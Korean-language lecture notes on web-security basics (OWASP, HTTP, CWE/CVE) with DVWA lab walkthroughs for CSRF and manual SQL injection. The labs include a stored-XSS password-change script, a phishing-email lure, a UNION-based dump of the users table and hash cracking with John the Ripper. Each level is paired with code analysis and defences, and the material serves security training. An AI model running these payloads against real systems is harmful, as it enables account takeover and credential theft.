
## 144. 웹해킹 기초이론

### 1. OWASP 개요

#### 1-1. OWASP의 정의

웹해킹과 관련해 항상 나오는 단어가 OWASP이다. OWASP는 프로젝트로 되어 있으며, 웹 애플리케이션뿐만 아니라 소프트웨어의 보안과 취약점에 대한 대응 방안을 연구하는 비영리 단체이다.

보통 3~4년을 주기로 전 세계에서 많이 일어나는 웹해킹, 모바일 해킹에 대해 TOP10을 발 표한다. 현재 2025년도 버전이 나와 있으며 아직 한글판 번역본은 나와 있지 않고 영어판으 로 나와 있다.

#### 1-2. OWASP TOP10의 특징

인젝션 취약점의 경우 2022년도, 2019년도, 아주 옛날부터 현재까지 꾸준히 TOP10 안에 들어가는 취약점 중 하나이다. 그 이유는 전체적인 프로그램의 소프트웨어 버전이 올라가더라도 개발자가 코딩을 할 때 인젝션에 대한 보안 코딩을 추가하지 않으면 결국 뚫릴 수 있기 때문이다.

OWASP는 TOP10 외에도 ASVS, SAMM이라는 플랫폼을 제공하고 있다.


| 항목 | 설명 |
|---|---|
| ASVS | 애플리케이션에 대한 보안을 확인하는 표준 플랫<br>폼 |
| SAMM | 소프트웨어에 얼마만큼 보안성이 확립되어 있는<br>지 점검하는 플랫폼 |

#### 1-3. OWASP 제공 프로젝트와 도구

OWASP.ORG 사이트에는 OWASP TOP10에서부터 OWASP 웹 시큐리티 테스팅 가이드까지 다양한 프로젝트가 제공된다.

SAMM ASVS(애플리케이션 시큐리티 베리피케이션 스탠다드)

ModSecurity: 웹 애플리케이션 방화벽(WAF)을 구축하기 위한 도구로, 룰(Rule)을 기반으로 동작 WebGoat: 자바 기반의 웹해킹 실습 머신 ⚠️ OWASP TOP10은 2021년도 버전의 경우 영어판 외에 한글판도 PDF로 확인할 수 있다. 2025년도 버전은 한글 번역이 진행 중이며, OWASP 서울협회 사이트에서 한글화 작업을 진행하고 있다.

#### 1-4. TOP10 항목 확인 방법

TOP10의 각 항목을 클릭하면 관련 CWE, 대응 방안, 공격 시나리오(Attack 시나리오), 참고 자료가 상세히 설명되어 나온다. 2017년도 한글판 PDF에서는 인젝션이 1위였고, 취약한 인증(취약한 패스워드 등), XSS 등의 항목이 함께 비교되어 있다.

⚠️ 굳이 최신 버전의 PDF가 아니더라도 한글판이나 영어를 잘 한다면 최신 영어판을 봐 도 된다. 시간이 날 때마다 전체적으로 읽어보면 웹해킹 쪽에 많은 도움이 된다.

### 2. HTTP 상태 코드

#### 2-1. 상태 코드의 범위와 의미


| 코드 범위 | 의미 |
|---|---|
| 100번대 | 요청이 수신되어 처리 중임을 알려줌 |
| 200번대 | 서버가 정상적으로 응답했음을 나타냄 |
| 300번대 | 요청을 받아 처리할 수 있으나 추가적인 작업(리<br>다이렉션)이 필요함 |
| 400번대 | 클라이언트 측의 에러 |
| 500번대 | 서버 쪽의 에러 |

가장 많이 만나는 400번대 에러는 URL을 잘못 입력했을 때 만나는 404 Not Found이다. 500번대 중에서는 500과 502를 가장 많이 만나게 되는데, 500은 내부 서버에 문제가 있을 경우이고 502는 서버에서 라우팅이 제대로 이루어지지 않을 때 클라이언트에게 표시된다.

⚠️ 보통 404.html, 503.html 등 기본적인 에러 페이지가 아파치, 엔진엑스 설치 시 기본적으로 들어가 있다. 관리자가 이 파일을 찾아 웹페이지를 수정하면 클라이언트가 URL을 잘못 입력했을 때 다른 메시지를 보여줄 수 있다.

#### 2-2. 상태 코드의 활용

웹 해킹을 하는 입장 또는 방어하는 입장에서 상태 코드는 상당히 중요하다. 어떤 코드가 나 왔을 때 그 코드가 어떤 상태인지를 알아야 다음 처리를 어떻게 할 것인지 확인할 수 있다.

예를 들어 201번 코드가 나왔다면, 요청이 성공적이고 요청한 결과에 따라 새롭게 리소스가 웹서버에 생성되었다는 것을 의미한다. PUT 또는 POST 메소드를 통해 클라이언트가 요청을 하면 클라이언트가 요청한 리소스가 서버에 설치(업로드)되는 경우 201이 뜨게 된다.

⚠️ 많은 코드의 상태를 다 외울 필요는 없다. 필요한 것들이 있을 때마다 모질라 개발자 사이트(MDN Web Docs) 같은 곳에서 정보를 확인하면 된다.

### 3. HTTP 메소드

#### 3-1. 요청 방식으로서의 메소드

메소드라고 하는 것은 클라이언트가 서버에 요청할 때의 방식을 나타낸다.


| 메소드 | 설명 |
|---|---|
| GET | 서버로부터 데이터를 받기만 하므로 서버에 있는<br>리소스를 변경하거나 올리는 것은 불가능 |
| POST | 푹(PUT)과 유사하게 서버에 리소스를 올릴 수 있<br>어 변경사항이 일어날 수 있음 |
| HEAD | GET과 똑같지만 응답 본문(바디)은 포함하지 않<br>고 헤드 부분만 가져옴 |
| PUT | 클라이언트가 서버에 리소스를 올리거나 변경하<br>고자 할 때 사용 |
| DELETE | 서버에 있는 특정 리소스를 삭제하도록 요청. 다만<br>서버의 설정에 따라 실제 삭제 여부는 다름 |
| CONNECT | 서버와의 연결을 위해 사용 |
| OPTIONS | 통신 설정과 관련된 몇 가지 옵션을 지정해서 요청<br>할 때 사용 |
| TRACE | 경로 추적(루프백 테스트)을 진행할 때 사용 |
| PATCH | 특정 리소스의 일부분만을 수정하도록 요청. 동일<br>버전 내에서 부분적인 업데이트를 의미 |

⚠️ 메이저 버전을 바꾸는 것을 업그레이드라고 하고, 동일 버전 내에서 부분적인 것들을 업데이트하는 것을 패치라고 한다. 메소드 전체를 다 암기할 필요는 없으며 필요할 때마다 검색해서 보면 된다.

#### 3-2. 요청 헤더에 포함되는 값

클라이언트가 서버로 요청할 때 헤더 부분에 들어가는 값으로는 Accept, Cookie, Connection, Content-Type, Date, User-Agent 등이 일반적으로 많이 보인다. 이러한 값들은 버퍼 스위트(Burp Suite)에서 헤더 부분을 잡아서 확인할 수 있다.

### 4. CWE와 CVE

#### 4-1. CWE(Common Weakness Enumeration)

CWE는 Weakness Enumeration, 즉 약한 부분(취약점)에 대한 분류를 나타낸다. 전체적인 카테고리 분류를 나타내는 것이며, 특정 분류에서 여러 가지 취약점들이 존재할 수 있다.

#### 4-2. CVE(Common Vulnerabilities and Exposures)

CVE는 동일한 분류에서도 여러 가지 내용의 세부적인 취약점을 다룰 때 사용하는 코드이다. 표현 형식은 CVE-연도-일련번호로 구성된다.


| 구성 요소 | 의미 |
|---|---|
| 앞의 숫자(연도) | 이 취약점이 발견된 연도 |
| 뒤의 숫자(일련번호) | 해당 연도에서의 일련번호 |

예를 들어 우분투 16.X 버전에서 발생하는 커맨드 인젝션이나, 우분투 24.X 버전에서 설치된 MariaDB 10.X 버전에서 발생하는 SQL 인젝션이 있다면 이것은 CVE로 표현된다. CWE를 포함하고 있는 하위 개념이 CVE가 된다.

#### 4-3. 국제 표준화의 필요성

만약 코드화를 정리하여 분류하지 않으면 우리나라, 미국, 일본, 프랑스 등 각 나라에서 발생하는 여러 가지 취약점들을 각자 명명하게 되어 국제적으로 헷갈리게 된다. 그래서 국제적으 로 분류를 만들고, 그 분류 내에서의 세부적인 취약점들을 CWE/CVE 코드로 표준화하여 정리해 놓은 것이다.

이미 동일한 취약점이 발견되면 따로 코드화할 필요는 없고 기존 코드에 해당된다고 정리하 면 되며, 완전히 새로운 버전에서의 새로운 취약점이 발견되면 연도와 일련번호를 넣어 새로운 CVE를 만들어내고, 분류 자체가 완전히 다른 새로운 유형이라면 CWE를 새로 만들어낸 다.

⚠️ 칼리 리눅스의 웹브라우저에 기본적으로 북마크되어 있는 사이트 중 exploitdb.com이 있다. 코드값을 검색하면 분류, 취약점, 공격 코드까지 확인할 수 있다.

### 5. 웹해킹 실습 환경 소개

#### 5-1. 취약점을 내포한 실습 시스템


| 시스템 | 기반 언어 |
|---|---|
| DVWA | PHP |
| 빅박스(bWAPP) | PHP |
| WebGoat | 자바(Java) |
| 주스샵(Juice Shop) | PHP, 자바 등 혼합 |

DVWA는 취약점이 매우 많은 웹 애플리케이션을 나타내며, 가장 대중적으로 알려져 있다.

#### 5-2. 웹게임 사이트

웹게임 사이트는 웹서버에 문제를 풀 수 있도록 제공해 놓은 사이트를 의미한다. 반딧이라는 사이트, 선이나 파사라는 사이트 등 다양한 사이트들이 존재한다.

## 145. CSRF

### 1. CSRF 개요

#### 1-1. 개념

CSRF(Cross-Site Request Forgery)는 요청 대행 공격이다. 공격자는 해당 페이지에 대한 권한이 없지만, 권한을 가지고 있는 관리자(어드민)에게 공격자가 원하는 방향으로 요청을 실행하게 만드는 방식이다.

#### 1-2. CSRF를 마지막에 진행하는 이유

CSRF 공격은 XSS 취약점(Stored XSS)과 Brute Force 로그인 창을 활용하기 때문에 해당 항목들을 먼저 실습한 후 마지막에 진행한다.

#### 1-3. 공격 경로

CSRF 공격이 실행되는 경로는 다음과 같다.

XSS 취약점이 있는 게시판에 스크립트 삽입 메일(HTML 방식)에 공격 코드를 담아 전송 메신저 또는 SMS를 통한 피싱 링크 전송 관리자가 해당 링크를 클릭하는 순간 HTML 스크립트가 실행되어 공격자가 원하는 패스워드로 변경된다.

### 2. Low 레벨

#### 2-1. 기능 확인

CSRF 페이지는 관리자가 자신의 패스워드를 변경하는 기능이다. 새 패스워드와 확인 패스워드를 입력하고 Change 버튼을 클릭하면 패스워드가 변경된다.

URL을 확인하면 아래와 같이 세 개의 파라미터가 노출된다.


| 파라미터 | 역할 |
|---|---|
| password new<br>_ | 새로운 패스워드 |


| 파라미터 | 역할 |
|---|---|
| password conf<br>_ | 패스워드 확인 |
| Change | 변경 실행 버튼 값 |

#### 2-2. XSS Stored를 활용한 공격

XSS Stored 페이지의 게시판 입력란에 아래와 같이 패스워드 변경 URL을 스크립트 태그로 삽입한다.

<!-- src 속성에 패스워드를 변경하는 CSRF URL을 삽입 --> <script>window.location='<http://대상IP/vulnerabilities/csr f/?password_new=공격자패스워드&password_conf=공격자패스워드&Chan ge=Change>'</script> 관리자가 게시판에 접근하는 순간 스크립트가 실행되어 패스워드가 변경된다.

#### 2-3. 메일을 활용한 피싱 공격

네이버, 다음 등 이메일 서비스에서 HTML 편집 모드를 사용하면 메일 본문에 HTML 코드를 삽입할 수 있다.

<!-- 이벤트 당첨 등 클릭을 유도하는 내용과 함께 CSRF URL 링크를 삽입 --> 이벤트 당첨을 확인해 주세요. 주소를 확인해 주세요.

수신인란에 관리자 이메일을 입력하고 제목에 "이벤트에 당첨되었습니다" 등 클릭을 유도하는 문구를 작성한다. 본문에 HTML 방식으로 CSRF URL 링크를 삽입하여 발송한다.

관리자가 메일을 받고 링크를 클릭하면 패스워드가 공격자가 원하는 값으로 변경된다. 문자 메시지를 보내서 유도하거나, HTML·스크립트가 들어갈 수 있는 것들을 동원하는 방식으로도 가능하다.

#### 2-4. 공격 결과 확인

어드민의 원래 패스워드는 password 이지만, 테스트로 test 라고 변경한 후 test 로 로그인하면 정상적으로 로그인이 된ᓼ을 확인할 수 있다.

#### 2-5. 코드 분석

Low 레벨 코드는 사용자로부터 password_new 와 password_conf  두 값을 받아 일치하면 UPDATE 쿼리로 패스워드를 업데이트한다. 입력 값에 대한 어떠한 검증 작업도 없다.

// 두 패스워드 값이 일치하면 UPDATE 쿼리 실행 // 검증 없이 그대로 UPDATE // 일치하지 않으면 "Passwords did not match" 출력

### 3. Medium 레벨

#### 3-1. 보안 조치

Medium 레벨에서는 eregi()  함수를 사용하여 서버 도메인 주소와 HTTP Referer(참조) 주소를 대소문자 구분 없이 비교하는 코드가 추가된다.

// 대소문자 구분 없이 서버 도메인과 Referer 주소 비교 eregi(SERVER_NAME, HTTP_REFERER) // 이외 쿼리 문은 Low 레벨과 동일

#### 3-2. 취약점 지속 여부

XSS Stored 취약점이 있는 게시판은 동일한 서버 도메인에서 동작하므로, 스크립트가 실행될 때의 Referer도 동일한 도메인이 된다. 따라서 Low 레벨과 동일한 방법으로 우회가 가능하다.

서버 도메인과 Referer 주소에 대한 검증만 있을 뿐, 다른 검증은 없다.

### 4. High 레벨

#### 4-1. 보안 조치

URL에서 user_token  파라미터가 추가로 확인된다. 일회성 사용자 토큰 정보를 함께 검증한다.

#### 4-2. 취약점 지속 여부

어드민으로 로그인된 상태에서 토큰 정보가 유지되고 있다면, 해당 토큰을 활용하여 XSS Stored와 동일하게 작업이 가능하다.

#### 4-3. 코드 분석

// 사용자 토큰 정보 확인 // 마지막에 기존 토큰 삭제 후 새 토큰 생성 generate_session_token()

토큰 확인 로직이 추가된 것과 마지막에 새로운 토큰을 생성하는 함수가 추가된 것 외에는 Low 레벨과 동일하다.

### 5. Impossible 레벨

#### 5-1. 보안 조치

현재 패스워드를 입력하는 password_current  파라미터가 추가된다. 새 패스워드로 변경하려면 현재 패스워드를 정확히 입력해야 한다.

#### 5-2. 방어 효과

공격자가 현재의 패스워드를 모르는 상황에서는 패스워드 변경이 이루어지지 않는다. 관리 자에게 요청을 대행하더라도 현재 패스워드 입력이 필요하므로 공격 자체가 성립하지 않는다.

#### 5-3. 코드 분석

// password_current 파라미터를 추가로 받아서 // 현재 어드민 패스워드와 일치 여부 확인 // 일치해야만 새 패스워드 두 개 비교 후 UPDATE 진행

### 6. CSRF 종합 정리

CSRF 취약점이 발생하는 근본적인 이유는 관리자가 패스워드를 변경할 때 현재의 패스워드를 묻지 않는다는 것이다. 취약점 대응 방안은 아래와 같이 정리된다.


| 대응 방안 | 설명 |
|---|---|
| 현재 패스워드 재확인 | 변경 전 기존 패스워드를 입력하도록 강제한다. |
| 일회성 토큰 사용 | 요청마다 고유한 토큰을 발급하고 검증한다. |

UI 변경(창 방식, 입력 방식)만으로는 근본적인 취약점을 해결할 수 없다. 서버 측 코드에서 검증 로직이 반드시 구현되어야 한다.

## 146. DVWA

### 1. DVWA 설치

DVWA는 PHP 기반 웹 애플리케이션이다. Ubuntu 머신에 DVWA를 설치하려면 웹 서버 (Apache2), DB(MariaDB), PHP, 그리고 GitHub에서 소스를 받아오기 위한 Git이 필요하다.


| 구성 요소 | 패키지 |
|---|---|
| 웹 서버 | apache2 |
| DB 서버 | mariadb-server |
| PHP | php, php-mysqli, php-gd, libapache2-mod-php |
| 소스 다운로드 | git |

Ubuntu/Debian 계열은 apt 를 사용한다. Rocky Linux 계열은 dnf 를 사용하며, 웹 서버 패키지명도 apache2  대신 httpd 를 사용한다.

### 2. 시스템 업데이트

설치 전 패키지 목록을 최신 상태로 업데이트한다.

sudo apt update sudo apt upgrade

### 3. 패키지 설치

sudo apt install apache2 mariadb-server php php-mysqli phpgd libapache2-mod-php git 설치가 완료되면 Apache2, MariaDB, PHP, Git이 모두 설치된다.

### 4. MariaDB 설정

#### 4-1. MariaDB 서비스 시작

sudo systemctl start mariadb

#### 4-2. MariaDB 접속

# root 사용자로 접속 (초기 설치 시 패스워드 없음) mysql -u root -p # 패스워드 입력란에서 엔터만 입력 보안 설치(mysql_secure_installation)를 진행하지 않은 경우 root 패스워드가 없다. 이후 필요하다면 보안 설치를 통해 패스워드를 설정할 수 있다.

#### 4-3. 데이터베이스 생성

-- dvwa 데이터베이스 생성 CREATE DATABASE dvwa;

-- 생성 결과 확인 SHOW DATABASES;

SHOW DATABASES  실행 시 information_schema  등 기본 생성 DB와 함께 dvwa 가 목록에 나타난다.

information_schema  DB 안에는 tables , columns  등의 테이블이 존재하며, 각 테이블에 는 table_name , column_name  등의 칼럼이 있다.

#### 4-4. 사용자 생성

-- dvwa 계정을 localhost에서만 접근 가능하도록 생성 -- 패스워드는 dvwa123으로 지정 CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa123';

#### 4-5. 권한 부여

-- dvwa 데이터베이스의 모든 테이블에 대해 모든 권한 부여 GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';

-- 권한 설정 즉시 적용 FLUSH PRIVILEGES;


| 권한 관련 명령어 | 설명 |
|---|---|
| GRANT | 권한을 부여한다. |
| REVOKE | 권한을 해제한다. |
| ALL PRIVILEGES | 모든 권한을 부여한다. |
| FLUSH PRIVILEGES | 변경된 권한 설정을 즉시 적용한다. |

#### 4-6. MariaDB 종료

exit

### 5. DVWA 소스 다운로드

웹 서버의 기본 Document Root 디렉토리로 이동한 후 GitHub에서 DVWA를 클론한다.

# Apache의 기본 Document Root 디렉토리로 이동 cd /var/www/html # GitHub에서 DVWA 클론 (DVWA는 대문자) git clone <https://github.com/digininja/DVWA> 클론 완료 후 ls  명령으로 DVWA  디렉토리가 생성되었는지 확인한다.

ls # DVWA 디렉토리 확인 cd DVWA 접속 주소 구조는 아래와 같다.

http://[Ubuntu IP]/DVWA/

### 6. DVWA 설정 파일 수정

#### 6-1. 설정 파일 복사

cd config ls # config.inc.php.dist 파일 확인 # .dist 확장자를 제거하여 실제 설정 파일 생성 cp config.inc.php.dist config.inc.php

#### 6-2. 설정 파일 편집

sudo vi config.inc.php 수정해야 하는 항목은 다음과 같다.


| 항목 | 설정 값 | 비고 |
|---|---|---|
| $ DVWA['db server']<br>_ _ | 127.0.0.1 | 로컬(동일 머신)에 있는 DB에 접속 |
| $ DVWA['db database']<br>_ _ | dvwa | 앞서 생성한 DB 이름 |
| $ DVWA['db user']<br>_ _ | dvwa | 앞서 생성한 사용자 이름 |
| $ DVWA['db password']<br>_ _ | dvwa123 | 앞서 지정한 패스워드 |
| $ DVWA['db port']<br>_ _ | 3306 | MySQL 기본 포트, 변경 불필요 |

⚠️ db_server 에 Ubuntu 머신의 실제 IP 주소를 입력하면 연결 오류가 발생할 수 있다. 동일 머신 내 DB를 사용하므로 127.0.0.1 (로컬호스트)로 설정해야 한다.

### 7. 디렉토리 권한 설정

웹에서 접근하는 디렉토리의 소유자가 root로 되어 있으면 보안 문제가 발생할 수 있다. 웹서버 기본 계정( www-data )으로 소유자를 변경하고 권한을 설정한다.

# 소유자 및 그룹을 www-data로 변경 (-R: 하위 디렉토리 포함) sudo chown -R www-data:www-data /var/www/html/DVWA # 755 권한 적용 (-R: 하위 디렉토리 포함) sudo chmod -R 755 /var/www/html/DVWA


| 권한 | 설명 |
|---|---|
| chown | change owner, 소유자 변경 |
| -R | 하위 디렉토리 포함 (recursive) |
| www-data | Apache 웹 서버 기본 계정 |
| 755 | 소유자: 읽기·쓰기·실행, 그룹·기타: 읽기·실행 |

### 8. PHP 설정 수정

PHP 환경 설정 파일을 수정하여 실습에 필요한 기능을 활성화한다.

# PHP 설정 파일 경로 (Ubuntu 24 기준, PHP 8.3) sudo vi /etc/php/8.3/apache2/php.ini PHP 버전에 따라 경로의 버전 번호가 달라진다. (예: 7.6 버전이면 /etc/php/7.6/apache2/php.ini )

수정해야 하는 항목은 다음과 같다.


| 항목 | 변경 값 | 라인 번호 참고 | 비고 |
|---|---|---|---|
| display errors<br>_ | On | 약 518번 | PHP 에러를 화면에 표시 |
| allow url include<br>_ _ | On | 약 880번 | URL 기반 파일 포함 허용 |

; 518번 라인 근처 display_errors = On ; 880번 라인 근처 allow_url_include = On ⚠️ display_errors = On 은 개발·테스트 환경에서만 사용한다. 실제 서비스 배포 전에는 반드시 Off 로 변경해야 한다. 에러 메시지가 외부에 노출되면 공격자가 이를 이용하여 시스템 정보를 수집할 수 있다.

## 147. SQL Injection 수동 점검

### 1. SQL 인젝션 개요

#### 1-1. 취약점 발생 조건

SQL 쿼리 문을 받아들이는 코드 작성이 미비하거나, 입력 값에 대한 검증이 없을 경우 SQL 인젝션 취약점이 발생한다. 아주 많은 취약점 공격 방식들이 존재한다.

#### 1-2. 주요 점검 방식


| 방식 | 설명 |
|---|---|
| 에러 기반(Error-<br>based) | 작은 따옴표 등으로 문법 오류를 유발하고, DB의 에러 반응 여부를 확인한다. |
| 불린 기반<br>(Boolean-<br>based, Blind) | 참·거짓 쿼리문을 삽입하여 DB의 반응 차이로 결과를 판단한다. |
| 타임 기반(Time-<br>based) | 시간차를 두고 SQL 쿼리 문을 주기적·반복적으로 삽입하여 점검한다. |
| 유니온 셀렉트<br>(Union Select) | 다수의 SELECT 조회 결과를 하나로 합쳐 칼럼 정보를 추출한다. |

### 2. 환경 준비

DVWA 접속 후 위에서 세 번째 항목인 Setup/ResetDB를 클릭하여 Create/Reset Database를 실행한다. Security 레벨이 Low로 설정되어 있는지 확인한다. 현재 레벨은 브라우저 왼쪽 하단에서 확인할 수 있다.

### 3. Low 레벨 수동 점검

#### 3-1. 정상 동작 확인

User ID 입력란에 1부터 6까지 순차적으로 입력하면 아래와 같이 동작한다.

1~5 입력 시: First Name, Surname 두 개의 칼럼 정보 출력 6 입력 시: 아무런 반응 없음 → 유저 아이디는 5번까지 존재함을 확인

#### 3-2. URL 인코딩 확인

Submit 후 URL을 확인하면 직접 입력한 문자열과 다르게 표시되는 것을 볼 수 있다. + 나 %  기호가 들어가 있는 것이 보이는데, 이는 URL 인코딩된 것이다. URL 주소에 입력값이 전 달될 때 특수문자가 인코딩되어 나오는 것이다.

나중에 인코딩된 값을 활용하여 공격하는 방법들도 존재한다.

#### 3-3. 에러 기반 점검

작은 따옴표를 삽입하여 강제로 문법 오류를 발생시킨다.

5' 실행 결과 You have an error in your SQL syntax  메시지가 출력된다. 잘못된 쿼리 문을 전달 하더라도 DB 시스템이 에러 메시지로 반응한다는 것을 확인할 수 있다. 이러한 경우 SQL 인젝션 취약점이 존재할 가능성이 높아진다.

#### 3-4. 불린 기반 점검

OR 연산자를 이용하여 전체 조건을 참(true)으로 만드는 쿼리를 삽입한다.

-- '1'='1' 은 참, OR 연산으로 전체 조건이 참이 된다 5' OR '1'='1 뒤에 주석 처리를 추가하면 그 이후 구문을 무력화할 수 있다.

-- # 또는 -- 로 주석 처리 5' OR '1'='1' # 실행 결과, 아이디 5번뿐만 아니라 전체 5개 계정 정보가 모두 출력된다. 현재 Low 레벨에서는 SQL 쿼리 문에 대한 어떠한 입력을 하더라도 DB가 반응하도록 설계되어 있음을 확인할 수 있다.

#### 3-5. 칼럼 수 확인 (Union Select)

Union Select는 다수의 SELECT 조회 결과를 하나로 합쳐주는 쿼리 문이다. 이때 칼럼의 수가 일치해야만 정상 동작한다.

-- 칼럼이 1개인지 확인 5' UNION SELECT 1 # -- → 에러: "The used SELECT statements have a different num ber of columns" -- 칼럼이 2개인지 확인 5' UNION SELECT 1,2 # -- → 정상 출력: 칼럼이 2개임을 확인 -- 칼럼이 3개인지 확인 5' UNION SELECT 1,2,3 # -- → 다시 칼럼 수 오류: 칼럼은 2개로 확정

#### 3-6. DB 버전 정보 확인

두 번째 칼럼 자리에 @@version  함수를 삽입하여 DB 버전을 출력한다.

5' UNION SELECT 1,@@version # 실행 결과 예시: 5.1.54-log  → MySQL 계열 DBMS임을 확인. 버전을 검색 엔진에서 검색하면 해당 버전의 CVE 취약점 코드를 확인할 수 있으며, exploitdb 사이트에서 공격 코드를 조회할 수 있다.

#### 3-7. 데이터베이스 목록 확인

MySQL 계열 DBMS를 설치하면 기본으로 생성되는 데이터베이스는 아래와 같다.


| 기본 DB | 역할 |
|---|---|
| information schema<br>_ | DB 설계 구조 정보 저장 (어떤 DB, 테이블, 칼럼이 있는지) |
| performance schema<br>_ | DB 성능 관련 정보 저장 |
| mysql | MySQL 사용자 계정, 권한 정보 저장 |

information_schema  내 tables  테이블의 table_schema  칼럼에서 DB 목록을 조회한다.

5' UNION SELECT table_schema,2 FROM information_schema.tabl es # 실행 결과: information_schema , dvwa , mysql  세 개의 데이터베이스 확인.

#### 3-8. 테이블 목록 확인

dvwa 데이터베이스 안에 어떤 테이블이 있는지 확인한다. table_name  칼럼을 조회하되 WHERE 절로 dvwa DB만 필터링한다.

5' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' # 실행 결과: guestbook , users  두 개의 테이블 확인. 공격자 입장에서 users  테이블에 중요한 정보가 들어가 있을 가능성이 높다.

#### 3-9. 칼럼 목록 확인

information_schema  내 columns  테이블의 column_name  칼럼에서 users 테이블의 칼럼 목록을 조회한다.

5' UNION SELECT 1,column_name FROM information_schema.colum ns WHERE table_name='users' # 실행 결과: user_id , first_name , last_name , user , password , avatar , last_login , failed_login  등 다수의 칼럼 확인. user 와 password  칼럼에 계정 정보가 존재할 것으로 판단한다.

#### 3-10. 계정 정보 추출

dvwa.users 테이블에서 user와 password 칼럼을 직접 조회한다.

5' UNION SELECT user,password FROM dvwa.users # 실행 결과: admin부터 smithy까지 전체 계정명과 해시화된 패스워드 값 출력. 패스워드가 코드화(해시)되어 있음을 확인한다.

#### 3-11. 해시 방식 확인 및 크래킹

추출한 계정 정보를 파일로 저장한다.

# 파일 생성 (계정명:해시값 형식으로 작성) vi dvwa.txt 파일 내용 형식 예시:

admin:해시값 gordonb:해시값 1337:해시값 pablo:해시값 smithy:해시값 ⚠️ 패스워드 값 복사 시 공백이나 다른 문자가 포함되지 않도록 주의해야 한다. admin과 smithy는 해싱된 값이 동일하므로 크래킹 결과도 동일한 패스워드가 나온다.

해시 방식을 확인한다. 5개 계정 중 아무 해시 값이나 하나를 입력하면 된다.

# hash-identifier 도구로 해시 방식 판별 sudo hash-identifier # 해시 값 입력 → Possible Hashes에서 MD5 방식 확인 hash-identifier 실행 시 Possible Hashes 항목에 아무것도 뜨지 않을 때가 있다. 이 경우 해당 도구로는 확인이 불가능한 것이므로, decode.fr 이나 사이버셰프(CyberChef)  등 다른 사이트를 이용해서 확인한다.

John the Ripper로 패스워드를 크래킹한다.

# --format 옵션으로 MD5 방식 지정 sudo john --format=Raw-MD5 dvwa.txt 앞으로 파일을 만들어 크래킹할 때, MD5가 나왔다면 Raw-MD5 , Base64가 나왔다면 해당 방식을 --format  옵션에 지정하면 된다.

크래킹 결과 예시:


| 계정 | 패스워드 |

| admin | password |
| smithy | password |
| gordonb | abc123 |

### 4. Low 레벨 코드 분석

코드를 확인하면 id  파라미터에 사용자가 입력한 값을 그대로 변수에 저장하고, 별도 검증 없이 쿼리 문으로 만들어 실행한다. 입력 값에 대한 검증 절차가 하나도 없다. 단지 받아서 변수에 넣고 뿌려주는 것뿐이다.

### 5. Medium 레벨

#### 5-1. 특징

입력 방식이 드롭다운 선택 방식으로 변경되어 UI에서 직접 SQL 쿼리 입력 불가 URL에도 파라미터가 보이지 않음

#### 5-2. ZAP 프락시를 활용한 파라미터 확인

ZAP 프락시(Zed Attack Proxy)를 실행하고 브라우저의 프락시 설정을 적용한 후, Submit 버튼을 클릭한다. ZAP에서 요청(Request) 정보를 확인하면 id 라는 파라미터에 선택된 값이 전달되고 있음을 확인할 수 있다.

#### 5-3. Break 기능을 활용한 점검

ZAP 도구 모음에서 녹색 원(Break) 버튼을 클릭하면 브레이크가 걸린다. 이 상태에서 Submit을 실행하면 서버로 전송되기 전에 요청이 중단되어 파라미터 값을 직접 수정할 수 있다.

포워딩 방법은 두 가지다.


| 버튼 | 동작 |
|---|---|
| 한 단계씩 포워딩 | 요청을 한 건씩 순서대로 전달한다. |
| 일괄 포워딩 | 남은 모든 요청을 한꺼번에 전달하여 완료시킨다. |

Burp Suite에서도 동일하게 한 단계씩 또는 한꺼번에 포워딩할 수 있다.

# id 파라미터에 작은 따옴표 없이 OR 구문 삽입 id=5 OR '1'='1' # ⚠️ Medium 레벨에서는 작은 따옴표를 삽입하면 Syntax error가 발생한다. 작은 따옴표를 제거한 상태로 진행해야 한다.

# 작은 따옴표 없이 참 조건 구성 id=5 OR 1=1 # 포워드하면 전체 계정 정보가 출력된다.

#### 5-4. 보안 대책의 한계

Medium 레벨의 보안 대책은 사용자가 웹브라우저, URL, 웹사이트에서 직접 SQL 쿼리 문을 입력하지 못하도록 UI를 개선한 것뿐이다. 프락시 툴의 인터셉트 기능을 이용하면 Low 레벨과 동일하게 계정 정보를 획득할 수 있다.

코드를 확인하면 쿼리 문 자체는 Low 레벨과 동일하며, 입력 값에 대한 서버 측 검증이 없다.

### 6. High 레벨

#### 6-1. 특징

UI가 변경되어 새 창에서 입력, 결과는 원래 창에 출력하는 방식 새 창과 원래 창의 세션 정보가 다를 수 있음 쿼리 문에 LIMIT 1 이 추가됨

#### 6-2. 취약점 확인

새 창에서 작은 따옴표를 입력하면 Syntax error가 아닌 "Something went wrong" 이라는 관리자가 임의로 설정한 메시지가 나온다. 정규 에러 표현을 보여주지 않아 취약점이 먹힐지 안 먹힐지 알 수 없도록 만들어 놓은 것이다.

아래 구문을 입력하면 전체 계정 정보가 출력된다.

5' OR '1'='1' #

#### 6-3. 코드 분석 결과

코드를 확인하면 LIMIT 1 이 추가된 것 외에는 Low 레벨과 동일하다. 창의 방식을 바꾸거나 입력 방식을 변경하더라도 근본적인 부분을 수정하지 않으면 취약점은 그대로 남아있다.

### 7. Impossible 레벨

#### 7-1. 보안 대책


| 보안 조치 | 설명 |
|---|---|
| is numeric()<br>_<br>검증 | id 파라미터에 정수 값이 들어오는지 확인한다. 정수 값이 아니면 실행하지 않는<br>다. |


| 보안 조치 | 설명 |
|---|---|
| 사용자 토큰 확인 | 일회성 토큰 정보를 URL에서 확인할 수 있으며, 토큰 검증이 이루어진다. |

#### 7-2. 점검 결과

작은 따옴표, OR 구문, 주석 처리, AND 구문 등 다양한 조합을 입력해도 아무런 반응이 없다. 잘못된 쿼리 문을 전달해도 DB에서 반응하지 않는다.

#### 7-3. 코드 분석

// id 파라미터가 정수 값인지 검증한 후 실행 is_numeric($id)

정수 값만 허용하므로 문자열 기반의 SQL 인젝션 시도가 차단된다.

### 8. SQL 인젝션 수동 점검 절차 요약

수동 점검의 기본 흐름은 다음과 같다.

### 1. 작은 따옴표 삽입: 문법 오류 유발 → DB의 Syntax error 반응 여부 확인

### 2. 참·거짓 구문 테스트: OR, AND 등으로 쿼리 조건을 변경하여 반응 차이 확인

### 3. 주석 처리 테스트: #  또는 -  등 주석으로 뒷부분 구문 무력화

### 4. Union Select로 칼럼 수 파악: 칼럼 수가 일치하면 정상 출력

### 5. 정보 추출: DB 목록 → 테이블 목록 → 칼럼 목록 → 데이터 순서로 진행

